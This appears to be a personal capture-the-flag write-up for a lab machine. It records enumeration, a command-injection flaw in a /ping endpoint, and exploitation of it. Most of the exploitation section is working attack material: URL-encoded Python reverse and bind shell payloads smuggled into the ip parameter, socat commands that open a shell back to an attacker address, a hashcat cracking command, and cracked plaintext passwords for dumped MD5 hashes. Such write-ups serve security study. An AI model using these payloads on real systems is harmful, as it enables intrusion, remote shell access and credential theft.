# Enumeration

## Port 31331

Robots.txt
http://10.10.255.126:31331/robots.txt

Sitemap:
http://10.10.255.126:31331/utech_sitemap.txt

Login page:
http://10.10.255.126:31331/partners.html

## Port 8081

Dir brute forcing:
- /auth
- /ping

Auth page:
http://10.10.255.126:8081/auth

Ping:
![[Pasted image 20240504174411.png]]

![[Pasted image 20240504174723.png]]

Command Injection vulnerability:
![[Pasted image 20240504175002.png]]
=> Semicolon character is filtered

# Initial foothold

## Exploit idea #1

Write python file *rshell.py* in request 1 and execute it in request 2:
```bash
GET /ping?ip=10.10.255.126`echo+"import+socket,os,pty\ns%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.10.255.126',7777))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/sh')"+>+rshell.py` HTTP/1.1
[...]
```

```bash
GET /ping?ip=10.10.255.126`python+rshell.py` HTTP/1.1
[...]
```
=> "socket.error: \[Errno 111] Connection refused"
Looks like we cannot create an outbound connection

## Exploit idea #2

Can we create a bind shell? (Port 4444)
```bash
GET /ping?ip=10.10.255.126`echo+"import+socket,os,subprocess\ns%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.bind(('0.0.0.0',4444))\ns.listen(5)\nc,a%3ds.accept()\nos.dup2(c.fileno(),0)\nos.dup2(c.fileno(),1)\nos.dup2(c.fileno(),2)\np%3dsubprocess.call(['/bin/sh','-i'])"+>+bshell.py` HTTP/1.1
```
Start bind shell:
```bash
GET /ping?ip=10.10.255.126`python+bshell.py` HTTP/1.1
```

Success!
![[Pasted image 20240504190113.png]]

### Create a proper shell

Upload socat (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) to the target.

On attacker:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:7777
```

On target:
```bash
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.9.0.187:7777
```


## SQLite database

Download SQLite database:
![[Pasted image 20240504190731.png]]

Dump:
![[Pasted image 20240504201127.png]]
```txt
admin|0d0ea5111e3c1def594c1684e3b9be84|0
r00t|f357a0c52799563c7c7b76c1e7543a32|0
```

# PrivEsc

Users:
![[Pasted image 20240504201746.png]]
Interesting users:
- lp1
- r00t

Crack MD5 hashes from sqlite database:
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
Results:
```bash
f357a0c52799563c7c7b76c1e7543a32:n100906                  
0d0ea5111e3c1def594c1684e3b9be84:mrsheafy
```
=> Creds:
admin:mrsheafy
r00t:n100906

**SSH + FTP login with r00t**

No files hosted on FTP server.

User is in **docker** group:
![[Pasted image 20240504210436.png]]

Privesc via docker group:
![[Pasted image 20240504210305.png]]

Proof:
![[Pasted image 20240504210409.png]]

Private SSH key:
![[Pasted image 20240504210951.png]]
=> last 9 chars: `SO+RAmqo=`